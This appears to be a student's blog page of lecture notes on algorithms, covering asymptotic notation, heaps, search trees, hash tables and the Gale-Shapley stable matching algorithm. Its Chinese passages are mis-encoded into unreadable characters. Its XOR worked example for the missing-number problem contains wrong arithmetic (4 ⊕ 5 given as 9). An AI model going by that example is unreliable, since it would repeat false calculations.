href="#attempt-2">Attempt 2</a></li><li><a href="#algorithm">Algorithm</a></li></ul></li></ul></li><li><a href="#puzzle">puzzle</a></li><li><a href="#lec2">Lec2</a><ul><li><a href="#question">Question</a></li><li><a href="#answer">Answer</a></li><li><a href="#big-ohnotation-examples">Big-Ohnotation: Examples</a><ul><li><a href="#example-1">Example 1</a></li><li><a href="#example-2">Example 2</a></li><li><a href="#example-3">Example 3</a></li></ul></li><li><a href="#question-1">Question</a></li><li><a href="#answer-1">Answer</a></li><li><a href="#big-omega-notation">Big-Omega notation</a><ul><li><a href="#definition">Definition</a></li></ul></li><li><a href="#big-theta-notation">Big-Theta notation</a><ul><li><a href="#definition-1">Definition</a></li></ul></li><li><a href="#question-2">Question</a></li><li><a href="#answer-2">Answer</a></li><li><a href="#sum-property">Sum property</a><ul><li><a href="#fact-of-sum">Fact of sum</a></li><li><a href="#fact-of-product">Fact of Product</a></li></ul></li><li><a href="#binaryheaps">(Binary)Heaps</a><ul><li><a href="#operations">Operations</a></li></ul></li><li><a href="#binary-search-trees">Binary search trees</a><ul><li><a href="#operations-1">Operations</a></li></ul></li><li><a href="#self-balancing-binary-search-trees">Self-balancing binary search trees</a></li><li><a href="#frequency-tables">Frequency tables</a><ul><li><a href="#problem-1">Problem</a></li><li><a href="#idea">Idea</a></li><li><a href="#challenge">Challenge</a></li><li><a href="#steps">steps</a></li><li><a href="#æ–¹æ³•1æ±‚å’Œ">æ–¹æ³•1ï¼šæ±‚å’Œ</a></li><li><a href="#æ–¹æ³•2xor">æ–¹æ³•2ï¼šXOR</a></li></ul></li><li><a href="#hash-tables">Hash tables</a><ul><li><a href="#operationsexpected">Operations(expected)</a></li><li><a href="#operations-worst-case">Operations (worst case)</a></li></ul></li></ul></li><li><a href="#proof">proof</a><ul><li><a href="#propositional-logic">Propositional logic</a></li></ul></li><li><a href="#mergesort">mergesort</a></li><li><a href="#stable-matching-problem">Stable Matching Problem</a><ul><li><a href="#gale-shapley-algorithm">Gale-Shapley algorithm</a></li><li><a href="#outline-of-algorithm">Outline of algorithm</a></li><li><a href="#å…³äºæ­¤ç®—æ³•æ›´æœ‰åˆ©äºè¿½æ±‚æ–¹è¢«è¿½æ±‚æ–¹å°‘åˆ©">å…³äºæ­¤ç®—æ³•æ›´æœ‰åˆ©äºè¿½æ±‚æ–¹ï¼Œè¢«è¿½æ±‚æ–¹å°‘åˆ©</a></li></ul></li><li><a href="#puzzle-1">puzzle</a></li></ul><h1 id="Lec"><a href="#Lec" class="headerlink" title="Lec"></a>Lec</h1><h1 id="Why-should-you-study-algorithms"><a href="#Why-should-you-study-algorithms" class="headerlink" title="Why should you study algorithms?"></a>Why should you study algorithms?</h1><p>This course is about problem solving and communication.</p><h2 id="Two-pillars"><a href="#Two-pillars" class="headerlink" title="Two pillars"></a>Two pillars</h2><h3 id="1-algorithm-design"><a href="#1-algorithm-design" class="headerlink" title="1. algorithm design"></a>1. algorithm design</h3><p><strong>algorithm design</strong> is the task of designing a process which, when executed, solves a particular problem;</p><p>This process might be a way of calculating something, selecting something, etc.</p><h3 id="2-algorithm-analysis"><a href="#2-algorithm-analysis" class="headerlink" title="2. algorithm analysis"></a>2. algorithm analysis</h3><p><strong>algorithm analys</strong> is is the task of assessing such a process (either your own work or someone elseâ€™s) with regards to the problem.</p><p>Does it always give the intended result?</p><p>How quickly does it run?</p><h1 id="Algorithm-analysis-why-is-correctness-important"><a href="#Algorithm-analysis-why-is-correctness-important" class="headerlink" title="Algorithm analysis: why is correctness important?"></a>Algorithm analysis: why is correctness important?</h1><p>A program which fails a test case is wrong, but a program which passes a test case isnâ€™t necessarily correct.</p><p>Failure on an obscure case can be catastrophic!</p><p>Testing is good, good testing is better, proof is best.</p><p>What makes a strong test?</p><p>How do you prove (or at least justify in general terms) correctness and explain it to a peer?</p><h1 id="Algorithm-analysis-why-is-efficiency-important"><a href="#Algorithm-analysis-why-is-efficiency-important" class="headerlink" title="Algorithm analysis: why is efficiency important?"></a>Algorithm analysis: why is efficiency important?</h1><p>Using better hardware might save a small (or even large) percentage of the running time of a program.</p><p>However a more efficient algorithm can make staggering improvements!</p><p>Sorting one million numbers could take an hour using bubble sort, or a second using merge sort.</p><p>For more sophisticated algorithms, details such as the choice of data structures are also important.</p><h1 id="Why-is-algorithm-design-important"><a href="#Why-is-algorithm-design-important" class="headerlink" title="Why is algorithm design important?"></a>Why is algorithm design important?</h1><p>Algorithm design is the â€˜planning stageâ€™, where we decide what our program should do.</p><p>We have all tried to code programs only to find a fundamental flaw in our approach later on.</p><p>A systematic approach to algorithm design separates engineers from â€œcode monkeysâ€.</p><h1 id="Code-first-approach"><a href="#Code-first-approach" class="headerlink" title="Code-first approach"></a>Code-first approach</h1><p>Solving the problem as you code can lead you into a â€œdebugging vortexâ€, applying patches without fixing the underlying issue, or to accept incorrect code that passes weak tests.</p><p><img src="/2025/02/19/COMP9101/wk1-lec/2025-02-19-17-31-23.png" alt></p><p>Separating design from implementation allows high-level reasoning to confirm that the algorithm meets the requirements of the problem before making implementation decisions.</p><p><img src="/2025/02/19/COMP9101/wk1-lec/2025-02-19-17-33-06.png" alt></p><h1 id="Separating-design-from-implementation"><a href="#Separating-design-from-implementation" class="headerlink" title="Separating design from implementation"></a>Separating design from implementation</h1><p>We will talk about algorithms in plain English. We will avoid pseudocode, and we will especially avoid using code in any programming language.</p><p>Implementation is outside the scope of this course.</p><p>Weâ€™ll focus on the big picture, to prepare you to:</p><ol><li><p>work in teams on large projects</p></li><li><p>communicate clearly and persuasively with stakeholders including colleagues, clients and the public</p></li><li><p>compile design briefs and documentation,</p></li></ol><p>which are all important skills for the modern computing professional.</p><h1 id="Course-Learning-Outcomes"><a href="#Course-Learning-Outcomes" class="headerlink" title="Course Learning Outcomes"></a>Course Learning Outcomes</h1><ol><li><p>Explain how standard design techniques are used to develop algorithms.</p></li><li><p>Solve problems by creatively applying algorithm design techniques.</p></li><li><p>Communicate algorithmic ideas at different abstraction levels.</p></li><li><p>Evaluate the efficiency of algorithms and justify their correctness.</p></li><li><p>Apply the LATEX typesetting system to produce high-quality technical documents.</p></li></ol><h1 id="What-is-an-algorithm"><a href="#What-is-an-algorithm" class="headerlink" title="What is an algorithm?"></a>What is an algorithm?</h1><p>An algorithm is a collection of precisely defined steps that can be executed <strong>mechanically</strong>, i.e. without intelligent decision-making.</p><p>Designing a recipe involves creativity, executing it does not; the same is true of algorithms.</p><p>The word â€œalgorithmâ€ comes by corruption of the name of <em>Muhammad ibn Musa al-Khwarizmi</em>, a Persian scientist 780â€“850, who wrote an important book on algebra, <em>â€œAl-kitab al-mukhtasar fi hisab al-gabr waâ€™l-muqabalaâ€</em>.</p><h1 id="Scope"><a href="#Scope" class="headerlink" title="Scope"></a>Scope</h1><p>In this course we will deal only with algorithms that are:</p><ol><li><p><strong>sequential</strong>: comprised by a sequence of steps, which can only be executed one at a time, and</p></li><li><p><strong>deterministic</strong>: each step always gives the same result for the same input.</p></li></ol><p>Parallel algorithms and randomised algorithms are interesting and powerful, but beyond the scope of this course.</p><h1 id="Problem-structure"><a href="#Problem-structure" class="headerlink" title="Problem structure"></a>Problem structure</h1><ol><li><p>Problems may have â€˜flavour textâ€™: a brief story for context. Abstracting this information away is a key first step.</p></li><li><p>Algorithm design tasks may also include an input and output specification if it is not otherwise clear.</p></li><li><p>In this course, we are usually not concerned with the format in which this information is presented, nor with the minute details of how an implementation of the algorithm accesses input or produces output.</p></li><li><p>However it is crucially important that our algorithm <strong>always</strong> transforms valid input into the appropriate output <strong>efficiently</strong>.</p></li></ol><p>Weâ€™ll usually measure the efficiency of algorithms using asymptotic analysis, rather than the exact time or number of operations taken.</p><p>You will have already encountered big-Oh notation.</p><ul><li><p>For example, a process consisting of two nested loops â€œfor each i from 1 to n, for each j from 1 to nâ€ takes $O(n^2)$ time.</p></li><li><p>Weâ€™ll formalise these ideas in the next lecture.</p></li></ul><p>Weâ€™ll usually use the <strong>unit-cost</strong> model of computation, where each machine operation (+, âˆ’, Ã—, Ã· and accessing memory) takes constant time.</p><ul><li>The only exception is when we discuss algorithms to multiply large integers in Module 2: there weâ€™ll use the <strong>logarithmic-cost</strong>  model, where these operations take time dependent on the  width (number of bits) of the input numbers.</li></ul><h1 id="Example-problem-Geese-in-a-Trenchcoat"><a href="#Example-problem-Geese-in-a-Trenchcoat" class="headerlink" title="Example problem: Geese in a Trenchcoat"></a>Example problem: Geese in a Trenchcoat</h1><p><img src="/2025/02/19/COMP9101/wk1-lec/2025-02-19-17-50-51.png" alt></p><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><p>There are n geese in a gaggle, of heights $h_1,â€¦,h_n$. Each $h_i$ is a positive integer.</p><p>They need to select two of themtoweara trenchcoat together,with one standing on top of the other.The trenchcoat will only fit if the two geese have total height exactly equal to H.</p><p>Design an algorithm which runs in $O(n logn)$ time and determines whether the there two geese who can wear the trenchcoat together.</p><h2 id="Abstraction"><a href="#Abstraction" class="headerlink" title="Abstraction"></a>Abstraction</h2><p>Design an algorithm which runs in $O(n logn)$ time and, given an array $A$ consisting of $n$ positive integers and a positive integer $X$, determines whether there are two indices  $i&lt;j$ such that $A[i]+A[j]=X$.</p><ul><li>If we fix index <em>i</em> (one of thegeese), then we know that a matching element must contribute the rest of the total (make up the rest of the required height).</li><li>Letâ€™s try all values of i.</li></ul><h2 id="Example-problem-Geese-in-a-Trenchcoat-1"><a href="#Example-problem-Geese-in-a-Trenchcoat-1" class="headerlink" title="Example problem: Geese in a Trenchcoat"></a>Example problem: Geese in a Trenchcoat</h2><h3 id="Attempt-1"><a href="#Attempt-1" class="headerlink" title="Attempt 1"></a>Attempt 1</h3><p>For each goose i,check whether a matching goose (whose height is $Hâˆ’h_i$) exists, and answer yes if one is found.</p><ul><li><p>This is not an algorithm!</p></li><li><p>It does not describe how to actually perform this check.</p></li><li><p>Why does this matter?</p></li><li><ul><li>For a small number of geese,a human could follow this process, checking by eye. If there were say one million geese, itâ€™s not at all clear how to do the check.</li></ul></li><li><ul><li>Perhaps this check takes time?</li></ul></li></ul><p>The Big-Oh is:</p><script type="math/tex; mode=display">(n-1)+(n-2)+...+(1) = \frac{n*(n-1)}{2} \in O(n^2)</script><h3 id="Attempt-2"><a href="#Attempt-2" class="headerlink" title="Attempt 2"></a>Attempt 2</h3><p>For each goose i, a matching goose must have height $H - h_i$. For each other goose $j$, check whether $h_j$ equals this quantity, and answer yes if one is found.</p><ul><li>This is actually an algorithm</li><li>It is also a correct algorithm.</li><li><ul><li>Does it correctly answer all â€˜yesâ€™ instances?</li></ul></li><li><ul><li>Does it correctly answer all â€˜noâ€™ instances?</li></ul></li><li><p>Unfortunately itâ€™s too slow: â€œfor each i (of which there are n), for each j (of which there are n), do somethingâ€ is already  $n^2$ iterations.</p></li><li>Can we search efficiently for the correct j, rather than trying them all? Perhaps if the heights are well organised.</li></ul><h3 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h3><p>Sort the geese in ascending order of height, using merge sort.</p><p>For each goose i, a matching goose must have height $H - h_i$. Since the heights are now nondecreasing, we can search for this required length using binary search, and answer yes if it is found.</p><p>Is this algorithm correct?</p><ul><li>Does it correctly answer all â€˜yesâ€™ instances?</li><li>Does it correctly answer all â€˜noâ€™ instances?</li></ul><p>What is the time complexity of this algorithm?</p><ul><li>How long does the sort take?</li><li>How many times is the binary search run?</li><li>How long does each binary search take?</li></ul><p>You will usually have to justify that your algorithm is correct and that it runs with in the specified time complexity.</p><hr><h1 id="puzzle"><a href="#puzzle" class="headerlink" title="puzzle"></a>puzzle</h1><p>Problem: Tom and his wife Mary went to a party where nine more couples were present.</p><p>Not everyone knew everyone else, so people who did not know each other introduced themselves and shook hands. People who knew each other from before did not shake hands.</p><p>Later that evening Tom got bored, so he walked around and asked all other guests (including his wife) how many hands they had shaken that evening, and got 19 different answers.</p><ol><li><p>How many hands did Mary shake?</p></li><li><p>How many hands did Tom shake?</p></li></ol><hr><h1 id="Lec2"><a href="#Lec2" class="headerlink" title="Lec2"></a>Lec2</h1><p><strong>Heap sort</strong> is faster than <strong>bubble sort</strong>.</p><p><strong>Linear search</strong> is slower than <strong>binary search</strong>.</p><p>The statements on the previous slide are most commonly made in comparing the <strong>worst case performance</strong> of these algorithms.</p><p>They are actually <strong>false</strong> <strong>in the best case</strong>!</p><p>In most problems in this course, we are concerned with <strong>worst case performance</strong>, so as <strong>to be robust to maliciously created (or simply unlucky) instance</strong></p><p>We will <strong>hardly</strong> ever <strong>discuss the best case</strong>.</p><h3 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h3><p>If $f(100) &gt; g(100)$, then does f represent a greater running time, i.e. as lower algorithm?</p><h3 id="Answer"><a href="#Answer" class="headerlink" title="Answer"></a>Answer</h3><p>Not necessarily! $n=100$ might be an outlier, or too small to appreciate the efficiencies of algorithm $f$. We care more about which algorithm <strong>scales better</strong>.</p><h3 id="Big-Ohnotation-Examples"><a href="#Big-Ohnotation-Examples" class="headerlink" title="Big-Ohnotation: Examples"></a>Big-Ohnotation: Examples</h3><h4 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1"></a>Example 1</h4><p>Let $f(n)=100n$. Then $f(n)=O(n)$, because $f(n)$ is at most 100 times $n$ for largen.</p><h4 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2"></a>Example 2</h4><p>Let $f(n)=2n+7$. Then $f(n)=O(n^2)$, because $f(n)$ is at most 1 times $n^2$ for large $n$. Note that $f(n)=O(n)$ is <strong>also true</strong> in this case.</p><p>è¿™é‡Œæ³¨æ„å•Šï¼ŒåŒºåˆ«ä¸‹<em>COMP9101</em>å’Œ<em>COMP9020</em>çš„åŒºåˆ«ï¼Œä¸å¤ªä¸€æ ·ï¼Œç®—æ³•æ²¡æ•°å­¦é‚£ä¹ˆä¸¥è°¨çœ‹æ¥ã€‚ $f(n)=2n+7$. Then $f(n)=O(n^2)$ $f(n)=O(n)$ is <strong>also true</strong>ï¼Œ åªè¦æ˜¯ä¸Šç•Œå‡½æ•°ï¼Œç”­ç®¡nè¿˜æ˜¯næ–¹è¿˜æ˜¯nç«‹æ–¹ï¼Œåªè¦æ¸è¿‘å¢é•¿å¤§å°±æ˜¯<strong>ä¸Šç•Œ</strong>ã€‚</p><h4 id="Example-3"><a href="#Example-3" class="headerlink" title="Example 3"></a>Example 3</h4><p>Let $f(n)=0.001n^3$. Then $f(n) \neq O(n^2)$, because for any constant multiple of $n^2$, $f(n)$ will eventually exceed it.</p><hr><p><strong>inserting</strong> into <strong>a binary search tree</strong> takes $O(h)$ time in the worst case, where <strong>h is the height of the tree</strong>, and </p><p><strong>insertion sort</strong> runs in $O(n^2)$ time in the <strong>worst case</strong>, but $O(n)$ in the <strong>best case</strong>.</p><h3 id="Question-1"><a href="#Question-1" class="headerlink" title="Question"></a>Question</h3><p>The definition states that we only care about the function values for â€œlarge enoughâ€ n. How large is â€œlarge enoughâ€? Put differently, how small is â€œsmall enoughâ€ that it can be safely ignored in assessing whether the definition is satisfied?</p><h3 id="Answer-1"><a href="#Answer-1" class="headerlink" title="Answer"></a>Answer</h3><p>Everything is small compared to the <strong>infinity</strong> of <em>n-values</em> beyond itself.</p><p>It doesnâ€™t matter how $f(1)$ compares to $g(1)$, or even how $f(1,000,000)$ compares to $g(1,000,000)$. We only care that $f(n)$ is bounded above by a multiple of $g(n)$ eventually.</p><h3 id="Big-Omega-notation"><a href="#Big-Omega-notation" class="headerlink" title="Big-Omega notation"></a>Big-Omega notation</h3><h4 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h4><p>We say $f(n)=â„¦(g(n))$ if for large enoughn, $f(n)$ is at least a constant multiple of $g(n)$.</p><h3 id="Big-Theta-notation"><a href="#Big-Theta-notation" class="headerlink" title="Big-Theta notation"></a>Big-Theta notation</h3><h4 id="Definition-1"><a href="#Definition-1" class="headerlink" title="Definition"></a>Definition</h4><p>We say $f(n)=Î˜(g(n))$ if</p><script type="math/tex; mode=display">f(n)=O(g(n)) \quad and \quad f(n)=â„¦(g(n))</script><p>$f(n)$ and $g(n)$ are said to have the same asymptotic growth rate.</p><ol><li><p>$f(n)$ and $g(n)$ are said to have the same asymptotic growth rate.</p></li><li><p>Analgorithm whose running time is $f(n)$ scales as well as one whose running time is $g(n)$.</p></li><li><p>Itâ€™s true-ish to say that the former algorithm is â€˜as fast asâ€™ the latter.</p></li></ol><h3 id="Question-2"><a href="#Question-2" class="headerlink" title="Question"></a>Question</h3><p>Youâ€™ve previously seen statements such as</p><hr><p>bubble sort runs in $O(n^2)$ time in the worst case.</p><hr><p>Should these statements be written using $Î˜(Â·)$ instead of $O(Â·)$?</p><h3 id="Answer-2"><a href="#Answer-2" class="headerlink" title="Answer"></a>Answer</h3><p>They can, but they donâ€™t have to be. The statements </p><hr><p>bubble sort runs in $O(n^2)$ time in the worst case</p><hr><p>and</p><hr><p>bubble sort runs in $Î˜(n^2)$ time in the worst case</p><hr><p>are both true: they claim that the worst case running time is <strong>at most</strong> quadratic and <strong>exactly</strong> quadratic respectively.</p><p>The $Î˜(Â·)$ statement conveys more information than the $O(Â·)$ statement. However <strong>in most situations we just want to be sure that the running time hasnâ€™t been underestimated</strong>, so <strong>$O(Â·)$ is the important part</strong>.</p><p>Note that sometimes confusions arise because people write the more commonly used $O(Â·)$ as a shorthand for the less commonly used $Î˜(Â·)$! Please be aware of the difference.</p><h3 id="Sum-property"><a href="#Sum-property" class="headerlink" title="Sum property"></a>Sum property</h3><h4 id="Fact-of-sum"><a href="#Fact-of-sum" class="headerlink" title="Fact of sum"></a>Fact of sum</h4><p>If $f_1 = O(g_1)$ and $f_2 = O(g_2)$, then $f_1 +f_2 = O(g_1 +g_2)$.</p><p><strong>The last term $O(g_1 +g_2)$ is often rewritten as $O(max(g_1,g_2))$, since $g_1 + g_2 â‰¤ 2 max(g_1,g_2)$</strong>.</p><p>The same property applies if $O$ is replaced by $â„¦$ or $Î˜$.</p><h4 id="Fact-of-Product"><a href="#Fact-of-Product" class="headerlink" title="Fact of Product"></a>Fact of Product</h4><p>If $f_1 = O(g_1)$ and $f_2 = O(g_2)$, then $f_1 Â·f_2 = O(g_1 Â·g_2)$.</p><h3 id="Binary-Heaps"><a href="#Binary-Heaps" class="headerlink" title="(Binary)Heaps"></a>(Binary)Heaps</h3><p>Store items in a complete binary tree, with every parent comparing $â‰¥$ all its children.</p><p>This is a max heap; replace $â‰¥$ with $â‰¤$ for min heap.</p><p>Used to implement priority queue.</p><h4 id="Operations"><a href="#Operations" class="headerlink" title="Operations"></a>Operations</h4><p>Build heap: $O(n)$</p><p>Find maximum: $O(1)$</p><p>Delete maximum: $O(log n)$</p><p>Insert: $O(log n)$</p><p><img src="/2025/02/19/COMP9101/wk1-lec/2025-02-23-22-34-21.png" alt></p><h3 id="Binary-search-trees"><a href="#Binary-search-trees" class="headerlink" title="Binary search trees"></a>Binary search trees</h3><p>Store (comparable) keys or key-value pairs in a binary tree, where each node has at most two children, designated as <strong>left</strong> and <strong>right</strong></p><p>Each nodeâ€™s key compares greater than all keys in its left subtree, and less than all keys in its right subtree.</p><h4 id="Operations-1"><a href="#Operations-1" class="headerlink" title="Operations"></a>Operations</h4><p>Let h be the height of the tree, that is, the length of the longest path from the root to the leaf.</p><p>Search: $O(h)$</p><p>Insert/delete: $O(h)$</p><p><img src="/2025/02/19/COMP9101/wk1-lec/2025-02-23-22-43-45.png" alt></p><h3 id="Self-balancing-binary-search-trees"><a href="#Self-balancing-binary-search-trees" class="headerlink" title="Self-balancing binary search trees"></a>Self-balancing binary search trees</h3><p>In the best case, $h â‰ˆ log_2 n$. Such trees are said to be <strong>balanced</strong>.</p><p>In the worst case, $h â‰ˆ n$, e.g. if keys were inserted in increasing order.</p><p>Fortunately, there are several ways to make a <strong>self-balancing</strong> binary search tree (e.g. <strong>B-tree</strong>, <strong>AVL tree</strong>, <strong>red-black tree</strong>).</p><p>Each of these performs rotations to maintain certain invariants, in order to guarantee that $h = O(log n)$ and therefore all tree operations run in $O(log n)$ time.</p><p>Red-black trees are detailed in <strong>CLRS</strong>, but in this course it is sufficient to write â€œself-balancing binary search treeâ€ without specifying any particular scheme.</p><h3 id="Frequency-tables"><a href="#Frequency-tables" class="headerlink" title="Frequency tables"></a>Frequency tables</h3><p>åå­—å…¶å®å°±æ˜¯â€œé¢‘ç‡ç»Ÿè®¡â€çš„æ„æ€ï¼Œåƒæ˜¯å­—å…¸ã€‚</p><h4 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h4><p>You are given an array A of $n-1$ elements. Each number from 1 to n appears exactly once, except for one number which is missing.</p><p>Find the missing number.</p><h4 id="Idea"><a href="#Idea" class="headerlink" title="Idea"></a>Idea</h4><p>Record whether youâ€™ve seen each possible value.</p><p>This leads to a <strong>linear time</strong>, <strong>linear space</strong> algorithm.</p><p>è¿™ä¸ªIdeaæ˜¯é¢‘ç‡ç»Ÿè®¡çš„æ–¹æ³•æ­¥éª¤ï¼Œä½†æ˜¯ç©ºé—´å¤æ‚åº¦æ¯”è¾ƒé«˜ $O(n)$ï¼Œä»¥ä¸‹æ˜¯æ§åˆ¶ç©ºé—´å¤æ‚åº¦ä¸º $O(1)$ çš„æ–¹æ³•</p><h4 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h4><p>How could you solve the problem in linear time and <strong>constant</strong> space?</p><h4 id="steps"><a href="#steps" class="headerlink" title="steps"></a>steps</h4><p>To count the occurrences of integers from 1 to m, simply make a zero-initialised array of frequencies and increment every time the value is encountered.</p><p>The real question is how to count the occurences of other kinds of items, such as large integers, strings, and so on.</p><p>Try to do the same thing: map these items to integers from 1 to m, and count the occurences of the mapped values.</p><h4 id="æ–¹æ³•1ï¼šæ±‚å’Œ"><a href="#æ–¹æ³•1ï¼šæ±‚å’Œ" class="headerlink" title="æ–¹æ³•1ï¼šæ±‚å’Œ"></a>æ–¹æ³•1ï¼šæ±‚å’Œ</h4><p><img src="/2025/02/19/COMP9101/wk1-lec/2025-02-23-22-57-59.png" alt></p><h4 id="æ–¹æ³•2ï¼šXOR"><a href="#æ–¹æ³•2ï¼šXOR" class="headerlink" title="æ–¹æ³•2ï¼šXOR"></a>æ–¹æ³•2ï¼šXOR</h4><p><img src="/2025/02/19/COMP9101/wk1-lec/2025-02-23-22-58-34.png" alt></p><p><img src="/2025/02/19/COMP9101/wk1-lec/2025-02-23-22-59-25.png" alt></p><p>å‡è®¾ A = [1, 2, 4, 5]ï¼Œæˆ‘ä»¬è¦æ‰¾ç¼ºå¤±çš„æ•° 3ï¼Œn = 5ã€‚</p><pre><code>1 âŠ• 2 âŠ• 3 âŠ• 4 âŠ• 5= (1 âŠ• 2) âŠ• 3 âŠ• (4 âŠ• 5)= 3 âŠ• 3 âŠ• 9= 0 âŠ• 9= 9</code></pre><p>Then</p><pre><code>1 âŠ• 2 âŠ• 4 âŠ• 5= (1 âŠ• 2) âŠ• (4 âŠ• 5)= 3 âŠ• 9= 10</code></pre><p>å®Œæ•´çš„ XOR âŠ• A é‡Œçš„ XOR = 9 âŠ• 10 = 3</p><h3 id="Hash-tables"><a href="#Hash-tables" class="headerlink" title="Hash tables"></a>Hash tables</h3><p>Store <strong>values</strong> indexed by <strong>keys</strong>.</p><p>Hash function maps keys to indices in a fixed size table.</p><p>Ideall no two keys map to the same index.</p><h4 id="Operations-expected"><a href="#Operations-expected" class="headerlink" title="Operations(expected)"></a>Operations(expected)</h4><p>Search for the value associated to a given key: $O(1)$</p><p>Update the value associated to a given key: $O(1)$</p><p>Insert/delete: $O(1)$</p><hr><p>A situation where two (or more) keys have the same hash value is called a <strong>collision</strong>.</p><p>When mapping from a large key space to a small table, itâ€™s <strong>impossible</strong> to completely avoid collisions.</p><p>There are several ways to manage collisions - for example, separate chaining stores a linked list of all colliding key-value pairs at each index of the hash table.</p><h4 id="Operations-worst-case"><a href="#Operations-worst-case" class="headerlink" title="Operations (worst case)"></a>Operations (worst case)</h4><p>Search for the value associated to a given key: $O(n)$</p><p>Update the value associated to a given key: $O(n)$</p><p>Insert/delete: $O(n)$</p><h1 id="proof"><a href="#proof" class="headerlink" title="proof"></a>proof</h1><h2 id="Propositional-logic"><a href="#Propositional-logic" class="headerlink" title="Propositional logic"></a>Propositional logic</h2><p>Propositions are true/false statements. Some examples:</p><ul><li><p>The sky is orange.</p></li><li><p>Basser Steps consists of more than 100 stairs.</p></li><li><p>Everyone in this room is awake.</p></li></ul><p>The goal of an argument is usually to establish a relationship between propositions, often also using the following operations.</p><div class="table-container"><table><thead><tr><th>Notation</th><th>Meaning</th><th>Formal term</th></tr></thead><tbody><tr><td>Â¬P</td><td>not P</td><td>negation</td></tr><tr><td>Pâˆ§Q</td><td>P and Q</td><td>conjunction</td></tr><tr><td>Pâˆ¨Q</td><td>P(inclusive-) or Q</td><td>disjunction</td></tr><tr><td>Pâ†’Q</td><td>if P then Q</td><td>implication</td></tr></tbody></table></div><p>The quantifiers â€œfor allâ€ ($âˆ€$) and â€œfor someâ€ ($âˆƒ$) are also very common.</p><h1 id="mergesort"><a href="#mergesort" class="headerlink" title="mergesort"></a>mergesort</h1><p>The depth of recursion in mergesort is $log_2 n$</p><p>On each level of recursion, merging all the intermediate arrays takes $O(n)$ steps in total.</p><p>Thus, mergesort always terminates, and in fact it terminates in $O(n log_2 n)$ steps.</p><h1 id="Stable-Matching-Problem"><a href="#Stable-Matching-Problem" class="headerlink" title="Stable Matching Problem"></a>Stable Matching Problem</h1><p>Suppose you have hired n frontend engineers and n backend engineers to build n apps in pairs.</p><p><img src="/2025/02/19/COMP9101/wk1-lec/2025-02-26-13-44-21.png" alt></p><p><img src="/2025/02/19/COMP9101/wk1-lec/2025-02-26-13-44-28.png" alt></p><p>Question</p><p>Give n frontend and n backend engineers, how many ways are there to match them, without regard for preferences?</p><p>Answer</p><p>$n!â‰ˆ(n/e)^n$ - more than exponentially many in $n$ ($eâ‰ˆ2.718$).</p><p>è¿™ä¸ªä¸ºå•¥ä¸æ˜¯ n ä¹˜ nï¼Œ å’Œä¹‹å‰æ•°å­¦å­¦ç»Ÿè®¡æ¦‚ç‡é‚£å„¿ä¸ä¸€æ ·ã€‚å› ä¸ºæ•°å­¦é‡Œæˆ‘é‡åˆ°çš„é—®é¢˜æ˜¯ï¼Œç¬¬ä¸€ä¸ªç¯®å­5è‹¹æœï¼Œç¬¬äºŒä¸ªç¯®å­3è‹¹æœï¼Œå‡ ç§é€‰æ‹©æ–¹æ³•ï¼Ÿæ˜¯$5 \times 3 = 15$ç§æŒ‘æ³•ã€‚è¿™é‡Œè¯´çš„æ˜¯åŒ¹é…é—®é¢˜ï¼Œäººäººéƒ½è¦åŒ¹é…ï¼Œå› æ­¤æ˜¯$n! = n \times (n-1) \times (n-2) \dots \times 1$.</p><p>$n!â‰ˆ(\frac{n}{e})^n$ æ˜¯ <strong>æ–¯ç‰¹æ—è¿‘ä¼¼</strong> (<strong>Stirlingâ€™s approximation</strong>) çš„ä¸€ç§ç®€åŒ–å½¢å¼ï¼Œå®ƒç”¨äºè¿‘ä¼¼è®¡ç®— é˜¶ä¹˜ $ğ‘›!$ çš„å¢é•¿é€Ÿåº¦ã€‚</p><p><strong>é˜¶ä¹˜</strong>çš„<strong>å¢é•¿é€Ÿåº¦</strong>æ¯”<strong>æŒ‡æ•°</strong>å¢é•¿<strong>æ›´å¿«</strong>ï¼Œä½†æ¯”è¶…æŒ‡æ•°å¢é•¿ï¼ˆå¦‚ $n^n$ ï¼‰æ…¢ã€‚</p><p><strong>Question</strong></p><p>Is it true that for every possible collection of n lists of preferences provided by all frontend engineers, and n lists of preferences provided by all backend engineers, a stable matching always exists?</p><p><strong>Answer</strong></p><p>Perhaps surprisingly, yes!</p><hr><h2 id="Gale-Shapley-algorithm"><a href="#Gale-Shapley-algorithm" class="headerlink" title="Gale-Shapley algorithm"></a>Gale-Shapley algorithm</h2><p><strong>Question</strong></p><p>Can we find a stable matching in a reasonable amount of time?</p><p><strong>Answer</strong></p><p>Yes, using the <strong>Gale-Shapley algorithm</strong>.</p><p>Produces pairs in stages, with possible revisions.</p><p>Frontend engineers will be pitching to backend engineers (arbitrarily chosen). Backend engineers will decide to accept a pitch or not.</p><p>A frontend engineer who is not currently in a pair will be<br>called solo.</p><p>Start with all frontend engineers solo.</p><h2 id="Outline-of-algorithm"><a href="#Outline-of-algorithm" class="headerlink" title="Outline of algorithm"></a>Outline of algorithm</h2><p>While there is a solo frontend engineer who has not pitched to all backend engineers, pick any such solo frontend engineer, say <strong>Femi</strong>.</p><p><strong>Femi</strong> pitches to the highest ranking backend engineer <strong>Brad</strong> on his list, ignoring any who he has pitched to before.</p><ul><li><p>If Brad is not yet paired, he accepts Femiâ€™s pitch (at least tentatively).</p></li><li><p>Otherwise, if Brad is already paired with someone else, say Frida </p></li><li><ul><li>if Brad prefers Femi to Frida, he turns down Frida and makes a new pair with Femi (making Frida now solo) 50</li></ul></li><li><ul><li>otherwise, Brad will turn down Femi and stay with Frida.</li></ul></li></ul><p><strong>Question</strong>. Does the algorithm work? And is it efficient?</p><p>To answer this, we will prove the following 3 claims:</p><p><strong>Claim1</strong></p><p>The algorithm terminates after $â‰¤ n^2$ rounds.</p><p><strong>Claim2</strong></p><p>The algorithm produces a <strong>perfect matching</strong>, i.e.when the algorithm terminates, the $2n$ engineers form $n$ separate pairs.</p><p><strong>Claim3</strong></p><p>The matching produced by the algorithm is <strong>stable</strong>.</p><p><a 